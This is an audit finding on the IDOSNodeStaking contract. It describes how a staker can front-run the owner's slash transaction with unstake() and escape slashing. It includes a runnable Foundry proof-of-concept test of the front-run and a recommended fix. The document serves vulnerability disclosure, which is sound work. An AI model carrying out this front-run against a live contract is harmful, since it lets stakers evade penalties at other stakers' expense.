reported at 2026/05/22

## [M-1][Duplicated] Slash front-running lets stakers escape node slashing

### Summary

`IDOSNodeStaking.slash(node)` can be front-run by a staker with `unstake(node, amount)`.  
Because `unstake()` immediately removes the user's stake from `stakeByNodeByUser` and  
`stakeByNode`, while `slash()` only marks the node as slashed and later withdraws the  
current `stakeByNode` amount, a MEV-aware staker can move their funds into the normal  
14-day unstake queue before the owner's slash transaction executes. After the delay,  
the staker withdraws the full amount and avoids the penalty.

Severity: Medium

Affected contract: `src/IDOSNodeStaking.sol`

Affected functions: `unstake(address,uint256)`, `slash(address)`,  
`withdrawUnstaked()`, `withdrawSlashedStakes()`

### Details

`unstake()` only checks whether the node is already in `slashedNodes` at execution time:

```scss
require(!slashedNodes.contains(node), NodeIsSlashed(node));
```

If the owner's `slash(node)` transaction is still pending in the public mempool, the  
node is not yet marked as slashed. The staker can therefore submit `unstake(node, fullStake)` with higher priority. That call immediately:

-   sets `stakeByNodeByUser[msg.sender][node]` to zero for the unstaked amount;
-   reduces or removes `stakeByNode[node]`;
-   appends the amount to `unstakesByUser[msg.sender]`.

When `slash(node)` executes after that, it does not snapshot historical stake or queued  
unstakes. It only adds the node to `slashedNodes` and emits the remaining  
`getNodeStake(node)` value. `withdrawSlashedStakes()` then withdraws the current  
`getSlashedNodeStakes()` amount, which no longer includes the attacker's unstaked  
tokens.

If other users are still staked to the same node, only those users' remaining stake is  
slashable. If the attacker is the sole staker and fully unstakes first, `stakeByNode`  
is removed and `slash(node)` reverts with `NodeIsUnknown`.

### Impact

The slashing mechanism becomes order-dependent and can be bypassed by sophisticated  
stakers monitoring owner transactions. This creates unequal enforcement:

-   MEV-aware stakers can escape slashing and recover their full principal after 14 days.
-   Non-MEV users who remain staked to the same node are still slashed.
-   If the escaping staker is the only staker on the node, the owner cannot slash the node  
    at all after the front-run unstake.

This does not require a malicious or compromised owner. The owner only needs to submit  
a legitimate `slash(node)` transaction through an observable transaction path.

Validation steps

### POC

The runnable Foundry PoC is in:

```bash
test/poc/SlashFrontRunningEscapePoC.t.sol
```

Copy the following code into the file at this path.

### POC

```perl
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {IDOSToken} from "../../src/IDOSToken.sol";
import {IDOSNodeStaking} from "../../src/IDOSNodeStaking.sol";

contract SlashFrontRunningEscapePoCTest is Test {
  IDOSToken internal idosToken;
  IDOSNodeStaking internal idosStaking;

  address internal owner = makeAddr("owner");
  address internal attacker = makeAddr("attacker");
  address internal victim = makeAddr("victim");
  address internal node = makeAddr("node");

  uint48 internal constant START_TIME = 365 days;
  uint256 internal constant EPOCH_REWARD = 100;
  uint256 internal constant ATTACKER_STAKE = 100;
  uint256 internal constant VICTIM_STAKE = 200;

  function setUp() public {
    vm.prank(owner);
    idosToken = new IDOSToken(owner);

    idosStaking = new IDOSNodeStaking(address(idosToken), owner, START_TIME, EPOCH_REWARD);

    vm.startPrank(owner);
    idosToken.transfer(address(idosStaking), 10_000);
    idosToken.transfer(attacker, 1_000);
    idosToken.transfer(victim, 1_000);
    idosStaking.allowNode(node);
    vm.stopPrank();

    vm.prank(attacker);
    idosToken.approve(address(idosStaking), type(uint256).max);

    vm.prank(victim);
    idosToken.approve(address(idosStaking), type(uint256).max);

    vm.warp(START_TIME);
  }

  function testSlashFrontRunningEscapeLetsAttackerRecoverStake() public {
    // Both users stake to the same node. A later slash should punish all stake still bound to this node.
    vm.prank(attacker);
    idosStaking.stake(address(0), node, ATTACKER_STAKE);

    vm.prank(victim);
    idosStaking.stake(address(0), node, VICTIM_STAKE);

    assertEq(idosStaking.getNodeStake(node), ATTACKER_STAKE + VICTIM_STAKE);
    assertEq(idosStaking.stakeByNodeByUser(attacker, node), ATTACKER_STAKE);
    assertEq(idosStaking.stakeByNodeByUser(victim, node), VICTIM_STAKE);

    // The attacker sees the owner's pending slash(node) transaction and front-runs it with unstake().
    vm.prank(attacker);
    idosStaking.unstake(node, ATTACKER_STAKE);

    // The attacker stake is no longer attached to the node before slash() executes.
    assertEq(idosStaking.stakeByNodeByUser(attacker, node), 0);
    assertEq(idosStaking.getNodeStake(node), VICTIM_STAKE);

    // The owner's slash transaction still executes, but it can only cover the remaining node stake.
    vm.prank(owner);
    idosStaking.slash(node);

    IDOSNodeStaking.NodeStake[] memory slashedNodeStakes = idosStaking.getSlashedNodeStakes();
    assertEq(slashedNodeStakes.length, 1);
    assertEq(slashedNodeStakes[0].node, node);
    assertEq(slashedNodeStakes[0].stake, VICTIM_STAKE);

    (uint256 attackerActiveStake, uint256 attackerSlashedStake) = idosStaking.getUserStake(attacker);
    (uint256 victimActiveStake, uint256 victimSlashedStake) = idosStaking.getUserStake(victim);
    assertEq(attackerActiveStake, 0);
    assertEq(attackerSlashedStake, 0);
    assertEq(victimActiveStake, 0);
    assertEq(victimSlashedStake, VICTIM_STAKE);

    // The owner can withdraw only the victim's remaining slashed stake, not the attacker's escaped stake.
    uint256 ownerBalanceBefore = idosToken.balanceOf(owner);
    vm.prank(owner);
    idosStaking.withdrawSlashedStakes();
    assertEq(idosToken.balanceOf(owner), ownerBalanceBefore + VICTIM_STAKE);

    // After the delay, the attacker withdraws the entire escaped stake from the normal unstake queue.
    skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);

    uint256 attackerBalanceBefore = idosToken.balanceOf(attacker);
    vm.prank(attacker);
    idosStaking.withdrawUnstaked();
    assertEq(idosToken.balanceOf(attacker), attackerBalanceBefore + ATTACKER_STAKE);
    assertEq(idosToken.balanceOf(attacker), 1_000);
  }

  function testSoleStakerCanFrontRunAndMakeSlashRevert() public {
    // If the attacker is the only staker, the same ordering removes the node from stakeByNode entirely.
    vm.prank(attacker);
    idosStaking.stake(address(0), node, ATTACKER_STAKE);

    vm.prank(attacker);
    idosStaking.unstake(node, ATTACKER_STAKE);

    assertEq(idosStaking.getNodeStake(node), 0);

    // slash() no longer sees a known staked node, so the owner's punishment transaction reverts.
    vm.prank(owner);
    vm.expectRevert(abi.encodeWithSignature("NodeIsUnknown(address)", node));
    idosStaking.slash(node);

    skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);

    uint256 attackerBalanceBefore = idosToken.balanceOf(attacker);
    vm.prank(attacker);
    idosStaking.withdrawUnstaked();
    assertEq(idosToken.balanceOf(attacker), attackerBalanceBefore + ATTACKER_STAKE);
    assertEq(idosToken.balanceOf(attacker), 1_000);
  }
}
```

Run:

bash Copy

```bash
forge test --match-contract SlashFrontRunningEscapePoCTest -vvv
```

The PoC covers two cases:

1.  `testSlashFrontRunningEscapeLetsAttackerRecoverStake`
    
    -   attacker stakes 100 IDOS to `node`;
    -   victim stakes 200 IDOS to the same `node`;
    -   attacker front-runs the pending owner slash by calling `unstake(node, 100)`;
    -   owner calls `slash(node)`;
    -   `getSlashedNodeStakes()` only reports the victim's remaining 200 IDOS;
    -   owner withdraws only 200 IDOS as slashed stake;
    -   after `UNSTAKE_DELAY`, attacker withdraws the full 100 IDOS.
2.  `testSoleStakerCanFrontRunAndMakeSlashRevert`
    
    -   attacker is the only staker on `node`;
    -   attacker front-runs with a full unstake;
    -   `stakeByNode` is removed;
    -   owner `slash(node)` reverts with `NodeIsUnknown`;
    -   attacker withdraws the full stake after the delay.

### Recommended Mitigation

Keep unstaked funds slashable during the unstake delay. The unstake queue should store  
the node address and the queued amount, and `slash(node)` should include both active  
stake and still-pending unstakes for that node. A staker who exits immediately before  
the slash should therefore remain punishable until their unstake delay has fully  
elapsed.

At minimum:

-   extend `Unstake` to include `node`;
-   do not remove the amount from the slashable accounting set until the delay has passed;
-   when slashing a node, mark all active and pending-withdrawal stake for that node as  
    slashed;
-   make `withdrawUnstaked()` skip or remove queue entries that became slashed before  
    withdrawal.

Operational mitigations such as private transaction submission can reduce exposure, but  
they should not be the only fix because the contract's correctness currently depends on  
transaction ordering.